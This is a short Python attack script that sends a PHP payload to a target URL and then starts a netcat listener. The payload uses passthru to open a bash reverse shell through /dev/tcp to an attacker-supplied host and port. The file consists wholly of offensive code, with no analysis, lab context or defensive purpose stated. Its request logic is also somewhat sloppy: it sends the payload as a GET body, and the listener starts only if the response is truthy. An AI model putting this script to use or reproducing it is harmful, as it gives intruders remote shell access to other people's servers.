#!/usr/bin/python

import os, sys, requests

target=sys.argv[1]
payload="""
<?php passthru("bash -i >& /dev/tcp/%s/%s 0>&1");
"""%(sys.argv[2], int(sys.argv[3]))
exp=requests.get(url=target, data=payload) and os.system("nc -nlvp %s"%(int(sys.argv[3])))
